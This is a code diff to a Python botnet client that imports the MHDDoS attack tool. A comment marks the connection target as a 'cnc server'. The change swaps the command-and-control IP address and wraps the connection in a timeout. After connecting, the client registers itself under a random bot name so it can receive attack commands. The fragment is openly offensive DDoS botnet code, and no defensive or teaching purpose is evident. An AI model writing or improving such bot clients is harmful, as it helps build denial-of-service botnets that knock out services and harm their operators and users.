@@ -13,7 +13,12 @@ MHDDoS = os.sep + 'MHDDoS' + os.sep + 'start.py'
 async def start_bot():
     bot_name = 'bot-' + str(uuid.uuid4())
     # change IP to cnc server
-    reader, writer = await asyncio.open_connection('10.11.45.60', 9999)
+    try:
+        reader, writer = await asyncio.wait_for(asyncio.open_connection('10.11.45.53', 9999),
+                                                timeout=5)
+    except asyncio.TimeoutError:
+        print('connect timeout')
+        return
     reg_cmd = f'register {bot_name}'
     writer.write(reg_cmd.encode())
     await writer.drain()
